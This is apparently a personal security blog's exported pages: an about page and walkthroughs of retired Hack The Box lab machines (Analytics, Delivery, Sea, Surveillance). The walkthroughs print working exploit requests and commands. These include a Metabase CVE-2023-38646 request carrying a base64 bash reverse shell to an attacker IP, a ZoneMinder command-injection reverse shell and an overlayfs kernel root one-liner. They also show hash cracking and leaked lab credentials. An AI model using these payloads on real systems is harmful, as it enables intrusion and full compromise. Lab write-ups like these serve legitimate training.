{"/about/":{"data":{"":"","contact#Contact":"Ricardo Morales Solorzano.\rHello, I’m Z4kr, a passionate computer enthusiast with a lifelong curiosity about how computers work. From an early age, I’ve been fascinated by the intricacies of technology, which eventually led me to the world of cybersecurity. Around 4 years ago, I began my journey into hacking through the Hack The Box platform, and since then, I’ve been fortunate to explore a vast range of topics within the field of cybersecurity.\nDuring my university days, I participated in multiple Google coding contests, which further solidified my passion for problem-solving and programming. Over time, I expanded my skills through platforms like PortSwigger.net, Hack The Box Academy, and VulnLab.\nI am an ethical hacker with a deep interest in penetration testing and red teaming. The goal of this page is to create a space where I can share my knowledge, insights, and techniques in this incredible world of cybersecurity. The primary focus will be on write-ups for retired Hack The Box machines, my personal projects, and proof-of-concept demonstrations.\nHack The Box (HTB)\rMachines\rTotal machines completed:\nEasy #: 23. Medium #: 16. Hard #: 3. insane #: 0 Total write-ups published: 4.\nProlabs \u0026 Certs\rHack The Box - Dante Pro Lab Completed on: Sept 2022 Hack The Box - Zephyr Pro Lab Completed on: Sept 2023 Contact\remail: z4rkseccontact@gmail.com Discord : w1nz4c4r#0200 ","hack-the-box-htb#Hack The Box (HTB)":"","ricardo-morales-solorzano#Ricardo Morales Solorzano.":""},"title":"About"},"/htb/":{"data":{"":" ","2024#2024":"\rSurvellance\rSurvellance is a medium machine of Hack The Box (HTB), the machine begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access to the system. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows me to access a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the ‘zoneminder’ user. The final step involves leveraging sudo privileges to achieve full root access.\nContinue to Survellance\nHands On!\rTurn on the machine on Hack The Box.\nAnalytics\rThis machine focuses on exploiting a vulnerable instance of Metabase to gain initial access. with the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.\nContinue to Analytics\nHands On!\rTurn on the machine on Hack The Box.\nDelivery\rCREATE AND INSERT EXCERPT FOR DELIVERY MACCHINE\nContinue to Delivery\nHands On!\rTurn on the machine on Hack The Box.","2025#2025":"\rSea\rSea is an Easy-rated Linux machine on Hack The Box that requires thorough web enumeration to uncover hidden directories and identify a vulnerable theme. Exploiting CVE-2023-41425 allows for remote code execution, leading to an initial foothold. A hashed password found in a database file is cracked to gain SSH access as a user. Privilege escalation is achieved by tunneling into a locally hosted service, leveraging access logs to execute commands as root.\nContinue to Sea\nHands On!\rTurn on the machine on Hack The Box."},"title":"HTB - WriteUps."},"/htb/easy/":{"data":{"":" ","2024#2024":"\rAnalytics\rThis machine focuses on exploiting a vulnerable instance of Metabase to gain initial access. with the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.\nContinue to Analytics\nHands On!\rTurn on the machine on Hack The Box.\nDelivery\rCREATE AND INSERT EXCERPT FOR DELIVERY MACCHINE\nContinue to Delivery\nHands On!\rTurn on the machine on Hack The Box.","2025#2025":"\rSea\rSea is an Easy-rated Linux machine on Hack The Box that requires thorough web enumeration to uncover hidden directories and identify a vulnerable theme. Exploiting CVE-2023-41425 allows for remote code execution, leading to an initial foothold. A hashed password found in a database file is cracked to gain SSH access as a user. Privilege escalation is achieved by tunneling into a locally hosted service, leveraging access logs to execute commands as root.\nContinue to Sea\nHands On!\rTurn on the machine on Hack The Box."},"title":"Easy"},"/htb/easy/analytics-htb/":{"data":{"":"","enumeration#Enumeration.":"\nThis machine focuses on exploiting a vulnerable instance of Metabase to gain initial access. with the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.\nℹ️\rTags:\nshow tags\rMetabase CVE-2023-38646 API UnAuthenticated RCE Base64 GameOver-lay Kernel exploits CVE-2023-2640 Enumeration.\rIP: 10.10.11.233 Enviroment: Linux Port Scan.\rWe sstart by using Nmap, performing a scan of all ports to discover services running on the target machine.\nsudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233\r# Nmap 7.94SVN scan initiated Tue Mar 12 21:07:41 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233 Nmap scan report for 10.10.11.233 Host is up, received echo-reply ttl 63 (0.073s latency). Scanned at 2024-03-12 21:07:42 EDT for 68s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc= | 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://analytical.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rThe scan reveal 2 open ports (22 \u0026 80) and we can see its redirecting to the domain analytical.htb. Adding analytical.htb to /etc/hosts allowed us to access the web service; after investigating the web page we can find a subdomain, data.analytical.htb, hosting a Metabase login page.","foothold#FootHold.":"Finding the exploit.\rI looked only for “metabase Vulnerabilities” and I am able to find an unauthenticated RCE vulnerability (CVE-2023-38646). CVE-2023-38646 is a critical vulnerability in Metabase, an open-source business intelligence tool, allowing pre-authentication remote code execution (RCE). This means an attacker can execute arbitrary commands on a Metabase server without needing valid login credentials. Exploiting this required extracting the setup token from the API endpoint /api/session/properties (for more information on this exploit, check this blog).\nExploit setup.\rIf we go to http://data.analytical.htb/api/session/properties we will be able to see some “restictied/privileged” information the API is providing us due to insufficient validation and accass control on metabase.\nsetup-token :249fa03d-fd94-4d5b-b94f-b4ebf3df681f By creating a payload encoded in Base64, we could inject a reverse shell via Metabase’s database setup. Here is an example of the post request that needs to be made to trigger the vulnerability:\nPOST /api/setup/validate HTTP/1.1 Host: localhost Content-Type: application/json Content-Length: 812 { \"token\": \"5491c003-41c2-482d-bab4-6e174aa1738c\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" } }\rHere’s the reverse shell payload: bash -i \u003e\u0026 /dev/tcp/10.10.14.13/443 0\u003e\u00261\rEncoded version: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgIDA+JjEK\rExploit execution.\rUsing Burp Suite’s Repeater, we sent a POST request to /api/setup/validate with the payload embedded in the request body.\nPOST /api/setup/validate HTTP/1.1 Host: data.analytical.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Content-Type: application/json Content-Length: 822 { \"token\": \"249fa03d-fd94-4d5b-b94f-b4ebf3df681f\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgIDA+JjEK}|{base64,-d}|{bash,-i}')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" } }\rBefore sending the Burp request (payload), we set up a listener on port 443 to capture the reverse shell.","privilege-escalation---root#Privilege escalation - Root.":"Something that i usually do when i get to a new system is to check the enviroment variables some times we can find useful information in there.\nenv\rInspecting the environment variables revealed application(metabase) credentials: •\tUser: metalytics •\tPassword: An4lytics_ds20223#\nUsing these credentials, we accessed the system via SSH to gain a more stable foothold: bash\nssh metalytics@10.10.11.233\rKernel Exploit for Privilege Escalation\rFinding kernel version\rThe target machine was running Ubuntu 22.04.2. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. This can be found either by using similar tools to linpeas.sh or using linux commands:\nuname -a\rAfter trying out multiple exploits I was able to find a working exploit.\nRunning exploit\rThe exploit involved leveraging unshare to execute a privileged shell.\nunshare -rm sh -c \"mkdir l u w m \u0026\u0026 cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026\u0026 touch m/*;\" \u0026\u0026 u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash \u0026\u0026 chmod 4755 /var/tmp/bash \u0026\u0026 /var/tmp/bash -p \u0026\u0026 rm -rf l m u w /var/tmp/bash\")'\rAfter running the executable created, we gained root access to the system:\nwhoami","takeaways#Takeaways:":" Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints. CVE research and public write-ups are invaluable for learning manual exploitation techniques. Kernel privilege escalation remains a go-to technique when user-level access is obtained. By following this step-by-step guide, we successfully exploited and rooted the machine. It’s a great example of chaining vulnerabilities for a complete compromise! "},"title":"Analytics - Hack The Box"},"/htb/easy/delivery-htb/":{"data":{"":"","enumeration#Enumeration":"","foothold#Foothold.":"","getting-root-password#Getting Root Password.":"From the following query I was able to find root hash. To identify the type of the hash that you have thanks to hashid. To find more on how to identify Hashes\nhashid -m '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'\rNow as we read on the mattermost chat server, I need to create some variants (add some rules) of the password PleaseSubscribe to crack the hash that we got. To learn more about learning how to add rules to an existent password please reffer to the following link\nhashcat --force pass.txt -r /usr/share/hashcat/rules/best64.rule --stdout\rWith the new dictionary created we are able to crack the password with the help of hashcat\nhashcat -m 3200 hash_root dict.txt\rFinally, I just need to login as root with the cracked password and we are able to find the root.txt flag\nssh root@10.10.10.222","privilege-escalation#Privilege Escalation":"\nℹ️\rTags:\nshow tags\rMattermost MySQL Hashcat Enumeration\rPort Scan\rWe start with the NMAP scan:\nnmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.10.222 # Nmap 7.93 scan initiated Fri Mar 3 10:50:32 2023 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.10.222 Nmap scan report for 10.10.10.222 Host is up, received echo-reply ttl 63 (0.047s latency). Scanned at 2023-03-03 10:50:32 EST for 216s Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c40fa859b01acac0ebc0c19518aee27 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1 | 256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY= | 256 b79df7489da2f27630fd42d3353a808c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7 80/tcp open http syn-ack ttl 63 nginx 1.14.2 |_http-title: Welcome | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.2 8065/tcp open unknown syn-ack ttl 63 | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Fri, 03 Mar 2023 15:39:20 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: rqguydjcq7fu7my6o44o7sw5pc | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Fri, 03 Mar 2023 15:52:43 GMT | \u003c!doctype html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003cmeta charset=\"utf-8\"\u003e\u003cmeta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"\u003e\u003cmeta name=\"robots\" content=\"noindex, nofollow\"\u003e\u003cmeta name=\"referrer\" content=\"no-referrer\"\u003e\u003ctitle\u003eMattermost\u003c/title\u003e\u003cmeta name=\"mobile-web-app-capable\" content=\"yes\"\u003e\u003cmeta name=\"application-name\" content=\"Mattermost\"\u003e\u003cmeta name=\"format-detection\" content=\"telephone=no\"\u003e\u003clink re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Fri, 03 Mar 2023 15:52:43 GMT |_ Content-Length: 0\rAs I usually do I start with the port that I feel most comfortable with, which in this case is port 80. this is a standard page but if we go to the contact us page you will be able to find the hostname for the webserver and one subdomain. From this, we see that we need a @delivery.htb email address to access the Mattermost server that is hosted on port 8065. To be able to access these two pages we need to add them to the /etc/hosts file:\nhttp://helpdesk.delivery.htb http://delivery.htb Foothold.\rSupport Page.\rmoving into the new pages we find on http://helpdesk.delivery.htb/index.php that it is hosting a Support ticketing system.\nSince we don’t have any type of credentials yet or any ticket number we proceed to create a new ticket (just filling in the mandatory fields).\nAfter creating it says that if we want to add more information to the ticket we should send an email to 6153164@delivery.htb.\nIf we try to check the ticket or update it, we are able to change Ticket details (such as the ticket name or add more comments to it.) but we are not able to do much more from here.\nNow looking for other alternatives, I proceed to check the page that’s hosting the Mattermost Service. This is an online chat with file sharing, search, and integrations. Also created as an internal chat for organizations and companies, it is also considered a viable alternative to SLACK. If you want to read more about Mattermost please refer to their documentation.\nMattermost.\rMoving on, I went to http://Delivery.htb:8065 and I was able to find mattermost’s login page.\nUntil this point, I don’t have any credentials right now. So I opt for creating a new account but if we recall from earlier enumeration we need a @Delivery.htb email to be able to access the chat server.\nWhen we try to complete the process with a random email (winzacar@yopmail.com) it says that it will send be a confirmation email to validate the user. Our problem here is that the boxes from HTB are not connected to the internet, thus we can not receive any type of “external” emails.\nIf we recall from our ticket registration (on the helpdesk page) we can send emails to update our ticket. My theory in this moment was to register with 6153164@delivery.htb as our email, so the confirmation email will update our ticket and I will be able to verify my registration to mattermost\nNow, We have to go back to http://helpdesk.delivery.htb and check the ticket status, for this I need to “login” with our email and the ticket number and we are able to see that comments has been updated with the mattermost email confirmation file\nMattermost Login.\rI says im registered successfully and if we want to confirm/verify the email by going to the link we can see that our email has been verified and we can now login into Mattermost\nafter loggin in we are prompted to select a team to join, in our case we only have one option which is “internal”\nAfter selecting the team we are added to a chat and we can see some credentials that are being reused in other places as well.\nuser = maildeliverer Pass = Youve_G0t_Mail! Then, I tested the credentials that I got with crackmapexec to check if they were valid.\ncrackmapexec ssh 10.10.10.222 -u maildeliverer -p Youve_G0t_Mail!\rSSH Login.\rAfter confirming that they are valid I just proceed to log in to the machine with ssh.\nssh maildeliverer@10.10.10.222\rand here we are able to get flag.txt.\nPrivilege Escalation\rNoving on with the privilege escalation I decided to check which users have the ability to execute commands from shell and we were able to find 3.\ncat /etc/passwd | grep sh$\rAs we are logged in as mailserver my first idea after finding the users was to check mattermost folder. For that, I just ran the following command and I was able to find it in the opt folder.\nfind / -user mattermost 2\u003e/dev/null | grep -v -E 'sys|proc|run'\rAfter looking into the files contained in that folder, I’m able to find inside de config folder a config.json file that contains some credentials to log in to the SQL server.\nMysql Server.\rI connect to the mysql DB with the credentials. For extra explanation on how to connect to the database please reffer the following Link\nmysql -h localhost -u mmuser -p enter password: Crack_The_MM_Admin_PW\r-h –\u003e hostname -u –\u003e username -p –\u003e password With the help of netstat (or linpeas), I was able to see that port 3306 was listening to the localhost. Then, after been logged in we are able to find the Mattermost DB.\nshow databases\ruse mattermost; show tables;\rTravesing the data Im able to find some usernames and passwords on the table “Users”\nSELECT Username, Password,EmailVerified FROM Users;"},"title":"Delivery - Hack The Box"},"/htb/easy/sea-htb/":{"data":{"":"\nSea is an Easy-rated Linux machine on Hack The Box that requires thorough web enumeration to uncover hidden directories and identify a vulnerable theme. Exploiting CVE-2023-41425 allows for remote code execution, leading to an initial foothold. A hashed password found in a database file is cracked to gain SSH access as a user. Privilege escalation is achieved by tunneling into a locally hosted service, leveraging access logs to execute commands as root.\nℹ️\rTags:\nshow tags\rfuzzing sub-directories wonder-CMS CMS CVE-2023-41425 XSS RCE hash-cracking hashcat BurpSuite command-injection ","conclusion#Conclusion":"This machine provided a comprehensive lesson in enumeration, vulnerability exploitation, and privilege escalation. Key takeaways include:\nThorough Enumeration: Always examine HTTP responses, directories, and server headers for clues. Research Known Vulnerabilities: Identifying software versions and matching them to CVEs can expedite exploitation. Creative Exploitation: Leveraging user interaction and local services is critical for advancing in restricted environments. Happy hacking! Stay tuned for more write-ups.","enumeration#Enumeration.":" IP: 10.10.11.28 Environment: Linux Port Scan.\rTo begin, I conducted an initial enumeration using nmap:\nsudo nmap -sS -sV -sC -p22,80 -Pn -n -vvv 10.129.109.135 -oA nmap/allPorts\r# Nmap 7.94SVN scan initiated Tue Aug 13 14:42:56 2024 as: nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.129.109.135 Nmap scan report for 10.129.109.135 Host is up, received user-set (0.12s latency). Scanned at 2024-08-13 14:42:57 EDT for 12s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8= | 256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM= | 256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Sea - Home | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 13 14:43:09 2024 -- 1 IP address (1 host up) scanned in 13.43 seconds\rThe scan revealed two open ports:\n22/tcp 80/tcp Host Discovery.\rVisiting the web page on port 80 revealed a hostname in a redirect link: sea.htb. This was added to /etc/hosts:\n10.10.11.28 sea.htb\rFuzzing the target.\rIdentifying folders.\rI began fuzzing the web server to identify directories using ffuf. After getting results I was able to identify some directories that were giving back status code 301 (forbidden).\nffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/FUZZ -c -fc 403","exploitation#Exploitation":"Upon using a python exploit script from GitHub,the script required specifying the URL, attacker IP, attacker port, and the path to the payload zip file:\npython3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.4 -p 1234 -r http://10.10.14.4/main.zip\rOnce the payload was prepared, I used the website’s contact form to deliver the malicious link to the admin, triggering the exploit.","foothold#Foothold.":"Targeted fuzzing.\rI tried to uncover hidden content by looking for files/folders within specific folders. The idea was to fuzz deeper into the directory structure, targeting areas that might not have the same level of protection or redirection rules. By isolating and testing these subdirectories. In this case I focused on the themes directory:\nffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/themes/FUZZ -c\rAfter reviewing these results the folder bike, was the one that caught my attention (eventhough it was giving 301 status). I decided to keep enumetating, fuzzing and digging deeper for more information.\nWithin /themes/bike/, I discovered a file called version. Accessing it revealed the software Version: 3.2.0.\nhttp://sea.htb/themes/bike/version Further exploration led to README.md, which provided details about the software used by the site - WonderCMS.\nVulnerability Discovery\rResearching the identified software version uncovered a critical vulnerability:\nCVE-2023-41425 - WonderCMS Cross-Site Scripting (XSS) leading to Remote Code Execution (RCE) This vulnerability affects WonderCMS versions 3.2.0 through 3.4.2. The vulnerability lies in the installModule component of WonderCMS, where user inputs are not adequately sanitized before being processed.\nTo make the exploit work the attacker should either be authentificated or somehow make an authentificated usr to execute the code. In the case of the machine there ir a bot that triggers this action.","privilege-escalation-amay#Privilege Escalation (Amay)":"Discovering the hash.\rWith a shell as www-data, I enumerated the filesystem and discovered a database file at /var/www/sea/data, containing a hashed password:\n$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q\rCracking the hash.\rUsing hashcat, I cracked the hash with the following command:\nhashcat -m 3200 DB.hash /usr/share/wordlists/rockyou.txt --force\rThe password was successfully recovered. Using this credential, I logged in as the user amay via SSH.\nssh amay@10.129.109.135","privilege-escalation-root#Privilege Escalation (Root)":"Local Service Discovery\rAs amay, I identified a service running on localhost at port 8080:\nnetstat -tunlp\rTo access it, I established local port forwarding:\nssh -D 8080 amay@10.129.109.135\rNavigating to http://localhost:8080, I found a dashboard requiring credentials. The credentials for amay worked, granting access to the dashboard.\nLog File Exploitation\rThe dashboard provided access to logs, including access.log and auth.log.\nBy intercepting the request in Burp Suite, I injected a malicious command to read the root.txt flag:\n;cat /root/root.txt;id;\rUpon execution, I successfully retrieved the root flag and verified root access."},"title":"Sea - Hack The Box"},"/htb/hard/":{"data":{"":" ⚠️\rComing Soon!"},"title":"Hard"},"/htb/medium/":{"data":{"":" ","2024#2024":"\rSurvellance\rSurvellance is a medium machine of Hack The Box (HTB), the machine begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access to the system. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows me to access a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the ‘zoneminder’ user. The final step involves leveraging sudo privileges to achieve full root access.\nContinue to Survellance\nHands On!\rTurn on the machine on Hack The Box."},"title":"Medium"},"/htb/medium/survellance-htb/":{"data":{"":"","enumeration#Enumeration":"","escalating-to-root#Escalating to Root":"I check if I have any sudo privileges with “ZoneMinder” user\nChecking for sudo privileges, we find that the zoneminder user can run scripts matching the pattern zm*.pl in /usr/bin:\ni look online for “escalate priviles zoneminder zm.pl” and i found an interesting GitHub page talking about something related.\nThe Security advisory basically says that this is affecting version \u003c 1.36.33. I check our working version, since I did not know if it was affected by the issue mentioned before\ndpkg -s zoneminder | grep Version\rThis command is used to check the version of a specific package installed on your system, in this specific case “zoneminder”. I check for config files of zoneminder and in found /etc/zm and it seems i can see its password in clear text!\nZoneMinderPassword2023 After reading for a while I was identify zmupdate.pl as a vulnerable script and craft a payload to exploit it. The script takes user input directly into a bash connection query, making it susceptible to command injection.\nTo exploit this, we create a payload that provides a reverse shell. First, we encode the payload in base64 to safely pass it as a command:\necho \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.35/443 0\u003e\u00261' \" | base64 -w0 NOW I send the payload:\nsudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';echo \"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEnIAo=\" |base64 -d |bash;'\rSince user input is going dirrectly into a bash connection query we can send some code in bash that will alter the behaviour and will alow us to get root","escalating-to-zoneminder#Escalating to ZoneMinder":"With access to Matthew’s account, I decided to do some more enumeration check for locally running services that might be exploitable:\nnetstat -tunlp\rI checked the page with curl but it turned out to be a lot of HTML code so i decided to make a port forwarding with chisel.\n#on Attacking machine ./chisel_lin server -p 443 --reverse #on Victim machine ./chisel_lin client 10.10.14.226:443 R:4444:127.0.0.1:4545 ./chisel_lin server -p 4545 --socks5 #on the attacking machine ./chisel_lin client localhost:4444 1081:socks\rAfter establishing the connection on my socks tunnel I am able to connect to the page hosted on localhost:8080 and that is when I realise that ZoneMinder more than an user its a service/software.\nThen i look for zoneminder exploits on google and I encounter with CVE-2023-26035: “Unauthenticated Remote Code Execution in ZoneMinder” I wasn’t able to find any type of information related to the version, but since it seemed to be a easy exploit to run i decided to give it a try. Also taking into account the year of the CVE it looked that it could be a possible way of attacking\nThe vulnerability lies in the way ZoneMinder handles the “snapshot” function. This function is supposed to capture an image from a connected security camera. However, due to a missing authorization check, an attacker can manipulate this function to create a new monitor instead of fetching an existing one. By crafting a specially crafted request, the attacker can inject malicious code that gets executed by the ZoneMinder server.\nI found a working Exploit on GitHub:\nproxychains python3 exploit-zone.py -t http://127.0.0.1:8080/ -ip 10.10.14.13 -p 445\rNOTE: This exploit did worked for me but for some reason not all the times, I had to ran it like 2-3 times for it to give me shell.\nThis grants us shell access as the zoneminder user.","foothold#FootHold":"","privilege-escalation-to-matthew#Privilege Escalation to Matthew":"\nSurvellance is a medium machine of Hack The Box (HTB), the machine begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access to the system. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows me to access a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the ‘zoneminder’ user. The final step involves leveraging sudo privileges to achieve full root access.\nℹ️\rTags:\nshow tags\rCMS Craft CMS Unauth-RCE CVE-2023-41892 Port fowarding CVE-2023-26035 Enumeration\rPort Scan\rFirst, let’s kick things off with an Nmap scan to enumerate open ports and services on the target:\nnmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245\r# Nmap 7.94SVN scan initiated Thu Mar 21 14:48:00 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245 Nmap scan report for 10.10.11.245 Host is up, received reset ttl 63 (0.058s latency). Scanned at 2024-03-21 14:48:01 EDT for 56s Not shown: 65533 closed tcp ports (reset) PORT STATE 